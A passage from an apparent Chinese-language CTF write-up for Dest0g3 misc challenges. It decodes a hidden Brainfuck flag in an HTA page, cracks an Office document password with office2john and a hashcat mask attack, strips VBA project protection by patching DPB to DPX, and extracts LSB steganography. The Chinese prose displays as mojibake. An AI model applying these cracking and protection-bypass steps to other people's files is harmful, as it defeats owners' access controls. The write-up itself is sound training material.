class="hljs-string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸­é—´çš„ä»£ç æå–å‡ºæ¥ã€‚æ‰“å¼€æµè§ˆå™¨çš„å¼€å‘æ¨¡å¼ï¼Œåœ¨æ§åˆ¶å°é‡Œé¢æŠŠä¸­é—´ä»£ç æ•²ä¸Šã€‚</p><p>ç•Œé¢å‡ºç°äº†ä¸€äº›å…ƒç´ ã€‚ç¿»æ‰¾é¡µé¢å…ƒç´ ã€‚å‘ç°äº†ä¸€ä¸ªpæ ‡ç­¾é¢œè‰²æ˜¯ç™½è‰²çš„ï¼Œç”±äºèƒŒæ™¯ä¹Ÿæ˜¯ç™½çš„ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬è¿™ç®—æ˜¯ä¸å¯è§ã€‚æ‰“å¼€çœ‹çœ‹ã€‚é‡Œé¢æ˜¯brainfuckçš„ä»£ç ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- <br>-.-.- --.++ ++++.<br>+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- <br>&gt;---&lt; ]&gt;--- ---.+ ++++. -----<br>.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.<br>&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+<br> +++++ .---- -.++. ++.+.<br>--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- <br>.+.-. ---.+ ++.+. -.+++<br>+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---<br>-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ <br>.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.<br>+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ <br>.---- .+.++ ++.-- --.++<br>++.-. ----. +.-.+ ++++. <br>&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;<br></code></pre></td></tr></table></figure><p>è§£ç å¾—åˆ°ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D<br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-number">0x446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h2><p>ç”¨hashcatå¯¹password.docmè¿›è¡Œçˆ†ç ´ã€‚</p><p>é¦–å…ˆæå–æ–‡ä»¶çš„hashã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/CTF/Dest0g]<br>â””â”€$ office2john password.docm <br>password.docm:$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1<br></code></pre></td></tr></table></figure><p>å¾—åˆ°è¾“å‡ºå»æ‰å‰é¢çš„æ–‡ä»¶åå†™å…¥åˆ°æ–‡ä»¶é‡Œã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10600</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">3</span> (Acrobat <span class="hljs-number">9</span>)                      | Documents<br><span class="hljs-attribute">10700</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">8</span> (Acrobat <span class="hljs-number">10</span> - <span class="hljs-number">11</span>)                | Documents<br> <span class="hljs-attribute">9400</span> | MS Office <span class="hljs-number">2007</span>                                   | Documents<br> <span class="hljs-attribute">9500</span> | MS Office <span class="hljs-number">2010</span>                                   | Documents<br> <span class="hljs-attribute">9600</span> | MS Office <span class="hljs-number">2013</span>                                   | Documents<br> <span class="hljs-attribute">9700</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4               | Documents<br> <span class="hljs-attribute">9710</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">1</span>  | Documents<br> <span class="hljs-attribute">9720</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">2</span>  | Documents<br> <span class="hljs-attribute">9800</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>/$<span class="hljs-number">4</span>, SHA1 + RC4              | Documents<br> <span class="hljs-attribute">9810</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">1</span>    | Documents<br> <span class="hljs-attribute">9820</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">2</span>    | Documents<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—åˆ°hashå¤´æ˜¯office2010ï¼Œtypeä¸º9500ã€‚</p><p>hintä¸­æç¤ºå¯†ç ä¸ºï¼š</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">The length <span class="hljs-keyword">of</span> docm &#x27;s password <span class="hljs-keyword">is</span> 6<br>The Regular Expression <span class="hljs-keyword">of</span> the password <span class="hljs-keyword">is</span>:<br><span class="hljs-comment">[a-z]</span> <span class="hljs-comment">[a-z]</span> q <span class="hljs-comment">[a-z]</span> b <span class="hljs-comment">[a-z]</span><br></code></pre></td></tr></table></figure><p>é‡‡ç”¨æ©ç çˆ†ç ´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/CTF/Dest0g]<br>â””â”€$ hashcat docxhash -a 3 -m 9500 ?l?lq?lb?l<br>...<br>...<br>$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1:ulqsbt<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: MS Office 2010<br>Hash.Target......: $office$*2010*100000*128*16*d135d71212d659473f2b5fb...6f4ab1<br>Time.Started.....: Mon May 23 14:56:52 2022 (4 mins, 53 secs)<br>Time.Estimated...: Mon May 23 15:01:45 2022 (0 secs)<br>Guess.Mask.......: ?l?lq?lb?l [6]<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:     1439 H/s (13.85ms) @ Accel:1024 Loops:512 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 421888/456976 (92.32%)<br>Rejected.........: 0/421888 (0.00%)<br>Restore.Point....: 12288/17576 (69.91%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:24-25 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: udqabt -&gt; uiqebx</span><br><br><span class="hljs-comment"># ulqsbt</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç ä¸ºulqsbtã€‚ä½†æ˜¯æˆ‘çš„wordä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰“ä¸å¼€è¿™ä¸ªæ–‡æ¡£ã€‚æ²¡è¾™äº†ï¼Œæˆ‘ä¹Ÿæ‡’å¾—ä¸‹å…¶ä»–officeã€‚</p><p>åé¢å‘ç°æ˜¯WindowsDefenderç»™æˆ‘æ‹¦äº†â€¦</p><p>æ‰“å¼€æ–‡ä»¶ï¼Œè¿è¡Œå®ï¼Œå¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ã€‚è¦æ±‚è¾“å…¥å¯¹åº”çš„å£ä»¤ã€‚ä½†æ˜¯å’±ä¸çŸ¥é“å£ä»¤ã€‚çœ‹çœ‹VBAçš„ä»£ç å§ã€‚ç»“æœVBAçš„ä»£ç æ˜¯åŠ å¯†çš„ï¼Œæœäº†ã€‚52ä¸Šé¢æ‰¾åˆ°äº†å¦‚ä½•ç ´è§£ã€‚</p><p>é¦–å…ˆå¦å­˜ä¸ºè¿™ä¸ªdocmæ–‡ä»¶ã€‚å°†æ–°ä¿å­˜çš„æ–‡ä»¶ç”¨zipæ‰“å¼€ã€‚æ‰¾åˆ°word/vbaProject.binã€‚å–å‡ºæ¥ç”¨äºŒè¿›åˆ¶æŸ¥çœ‹å™¨æ‰“å¼€ã€‚æŸ¥æ‰¾æ–‡ä»¶ä¸­çš„&quot;DPB&quot;å­—ç¬¦ä¸²ã€‚å°†å…¶ä¿®æ”¹ä¸ºâ€œDPXâ€</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DPB</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br>TOï¼š<br><span class="hljs-attribute">DPX</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br></code></pre></td></tr></table></figure><p>ä¿å­˜ä¹‹åï¼Œé‡æ–°æ”¹ä¸ºdocmæ–‡ä»¶ã€‚æ‰“å¼€ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ‰“å¼€å¯¹åº”çš„projectäº†ã€‚</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> CB_OK_Click()<br><span class="hljs-keyword">Dim</span> strpasw <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strdec <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strusrinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> t <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>t = ChrW(<span class="hljs-number">21152</span>) &amp; ChrW(<span class="hljs-number">27833</span>) &amp; ChrW(<span class="hljs-number">21543</span>) &amp; ChrW(<span class="hljs-number">65292</span>) &amp; ChrW(<span class="hljs-number">21516</span>) &amp; ChrW(<span class="hljs-number">23398</span>) &amp; ChrW(<span class="hljs-number">20204</span>) &amp; ChrW(<span class="hljs-number">65281</span>)<br><br>strusrinput = Dialog.TextBox_Pasw<br><span class="hljs-keyword">Dim</span> sinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>sinput = strusrinput<br><br><span class="hljs-keyword">If</span> (strusrinput &lt;&gt; <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">Then</span><br>  strusout = Encode(strusrinput, t)<br>  <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;â”¤â„¡Ç’qï½˜~&quot;</span>) <span class="hljs-keyword">Then</span><br>      strdec = Decode(Dialog.Label_ls.Caption, sinput)<br>  <span class="hljs-keyword">Else</span><br>     <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ï½‹GJEï½‡ï½‘&quot;</span>) <span class="hljs-keyword">Then</span><br>        strdec = Decode(Dialog.Label_ls1.Caption, sinput)<br>     <span class="hljs-keyword">Else</span><br>          <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;Ğ®ÎŸopz+&quot;</span>) <span class="hljs-keyword">Then</span><br>             strdec = Decode(Dialog.Label_ls2.Caption, sinput)<br>          <span class="hljs-keyword">Else</span><br>                <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ï½šÎšjrĞ¨Ï†Îµã‚&quot;</span>) <span class="hljs-keyword">Then</span><br>                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)<br>                <span class="hljs-keyword">Else</span><br>                    <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;Ã Ç–tï¼µï½—â”§ï½ˆÃ¨&quot;</span>) <span class="hljs-keyword">Then</span><br>                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)<br>                    <span class="hljs-keyword">Else</span><br>                          strdec = <span class="hljs-string">&quot;å¯†ç ä¸æ­£ç¡®,åˆ«æ³„æ°”å†æ¥!&quot;</span><br>                    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>                <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>           <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>      <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   Label_CLUE.Caption = strdec<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>åªè¦çœ‹è¿™ä¸ªæŒ‰é’®äº‹ä»¶å³å¯ã€‚</p><p>è¿™é‡Œé¢è¦åˆ¤æ–­æˆ‘ä»¬çš„è¾“å…¥æ˜¯å¦æ»¡è¶³è¦æ±‚ã€‚</p><p>æˆ‘ä»¬çš„å­—ç¬¦ä¸²é¦–å…ˆè¿›å…¥äº†Encodeç¼–ç äº†ä¸€ä¸‹ã€‚è€Œä¸”ç”¨çš„æ˜¯å›ºå®šå¯†é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥Decodeå¯¹åº”çš„ç›®æ ‡å­—ç¬¦ä¸²å°±èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„è¾“å…¥æ˜¯ä»€ä¹ˆã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-string">&quot;â”¤â„¡Ç’qï½˜~&quot;</span> : 123456<br><span class="hljs-string">&quot;ï½‹GJEï½‡ï½‘&quot;</span> : <span class="hljs-type">aaaaaa</span><br><span class="hljs-string">&quot;Ğ®ÎŸopz+&quot;</span> : 000000<br><span class="hljs-string">&quot;ï½šÎšjrĞ¨Ï†Îµã‚&quot;</span> : å¢™è§’æ•°æ<br><span class="hljs-string">&quot;Ã Ç–tï¼µï½—â”§ï½ˆÃ¨&quot;</span> : <span class="hljs-type">iloveyou</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯å¯¹åº”çš„å­—ç¬¦ä¸²æ‰€éœ€è¦è¾“å…¥çš„æ•°æ®ã€‚</p><p>ä¾æ¬¡å°è¯•ï¼Œåªæœ‰â€œå¢™è§’æ•°æâ€ç»™å‡ºäº†æç¤ºï¼š</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">è§£å‹å¯†ç :ä¸¤åªé»„é¹‚é¸£ç¿ æŸ³,ä¸€è¡Œç™½é¹­ä¸Šé’å¤©!<br></code></pre></td></tr></table></figure><p>Rarå¯†ç ä¸ºå¤æ‚å‹ï¼Œé•¿åº¦ä¸º16ä½ï¼ŒåŒ…å«äº†å­—æ¯ã€æ•°å­—å’Œç¬¦å·ã€‚è¿™ä¸€è¡Œè¯—åŠ ä¸Šç¬¦å·åˆšå¥½16ä½ã€‚æˆ‘è§‰å¾—å°±æ˜¯æŠŠè¿™å¥è¯—é¦–å­—æ¯æå‡ºæ¥å°±è¡Œäº†ï¼ŒåŠ ä¸Šç¬¦å·ã€‚ç”±äºè¦æœ‰æ•°å­—ï¼Œæ‰€ä»¥ä¸€æ”¹ä¸º1ï¼Œä¸¤æ”¹ä¸º2ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>å‘ç°ä¸å¯¹ï¼Œåˆæ¢äº†å…¶ä»–çš„å¯†ç ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>è¿™äº›éƒ½ä¸å¯¹ï¼Œå¥‡äº†æ€ªäº†â€¦</p><p>æœ€åå†™äº†ä¸ªè„šæœ¬æŠŠæ‰€æœ‰å¤§å°å†™éƒ½çˆ†ç ´ä¸€éï¼Œè¿˜æ˜¯ä¸è¡Œâ€¦</p><p>æœ€åæŠŠè¿™ä¸ªå°é—®é¢˜ç»™äº†æˆ‘é˜Ÿå‹ï¼Œç»“æœç»™ä»–è§£å‡ºæ¥äº†ã€‚å¯†ç æ˜¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt.<br></code></pre></td></tr></table></figure><p>ç»™æˆ‘å¹²æ²‰é»˜äº†â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</span><br></code></pre></td></tr></table></figure><h2 id="python_jail"><a class="markdownIt-Anchor" href="#python_jail"></a> Python_jail</h2><p>è§£å‹ä¹‹åï¼Œæœ‰ä¸ªå‹ç¼©åŒ…è¦å¯†ç ï¼Œç„¶åæœ‰ä¸€ä¸ªpasswordå’Œhintã€‚çœ‹äº†ä¸€ä¸‹passwordï¼Œå…¨æ˜¯ç©ºç™½å­—ç¬¦ï¼Œä»¥ä¸ºæ˜¯SNOWéšå†™ï¼Œä½†æ˜¯hinté‡Œé¢è¯´æ˜¯ä¸€ç§è¯­è¨€ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯white_spaceè¯­è¨€ã€‚</p><p><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p><p>å°†passwordé‡Œé¢çš„æ•°æ®å¯¼å…¥ï¼Œç‚¹å‡»å³ä¸Šè§’çš„Runè¿è¡Œã€‚å¾—åˆ°å¯†ç :</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a8e15220</span>-<span class="hljs-number">7404</span>-<span class="hljs-number">4269</span>-<span class="hljs-number">812</span>e-<span class="hljs-number">6418557</span>b7dc2<br></code></pre></td></tr></table></figure><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p>LSBæå–æœ‰äº›ä¿¡æ¯æ¯”è¾ƒä»¤äººæ³¨æ„ã€‚åœ¨ä¸‰é€šé“LSBä¸‹:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">e99881e59ca8e8bf 99e9878c5a6d7868  <span class="hljs-string">........</span> <span class="hljs-string">....Zmxh</span><br>5a3374694e574a6a 5a6d4d344e793031  Z3tiNWJj ZmM4Ny01<br>593245324c54517a 5a6a4574596a4d34  Y2E2LTQz ZjEtYjM4<br>4e4330314e325177 4f5749344f445a6a  NC01N2Qw OWI4ODZj<br>59546c3975230000 00e7949fe68890e6  YTl9u<span class="hljs-comment">#.. ........</span><br>8890e58a9f0a4669 6e6420697420696e  <span class="hljs-string">......Fi</span> nd it in<br>20796f757220666f 6c6465724e2904da   your fo lderN)<span class="hljs-string">..</span><br>046f70656eda0466 696c65da05777269  <span class="hljs-string">.open..f</span> ile.<span class="hljs-string">.wri</span><br>7465da057072696e 74a9007206000000  te.<span class="hljs-string">.prin</span> t.<span class="hljs-string">.r....</span><br>7206000000fa0766 6c61672e7079da08  r.<span class="hljs-string">.....f</span> lag.py..<br>3c6d6f64756c653e 0100000073040000  &lt;module&gt; <span class="hljs-string">....s...</span><br>000a020a01004190 409b0eccc7d6a2f9  <span class="hljs-string">......A.</span> @<span class="hljs-string">.......</span><br>df7fff3fffffffff 57fedfe2a159ef50  ..?<span class="hljs-string">....</span> W.<span class="hljs-string">...Y.P</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ä¸€ä¸²base64</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ZmxhZ<span class="hljs-number">3</span>ti<span class="hljs-symbol">NWJjZmM4</span><span class="hljs-symbol">Ny01</span>Y<span class="hljs-number">2</span>E<span class="hljs-number">2</span>LTQzZjEtYj<span class="hljs-name">M4</span><span class="hljs-symbol">NC01</span><span class="hljs-symbol">N2</span>QwOWI<span class="hljs-number">4</span>ODZjYTl<span class="hljs-number">9</span>u<br>base<span class="hljs-number">64</span>ï¼š<br>flag&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span 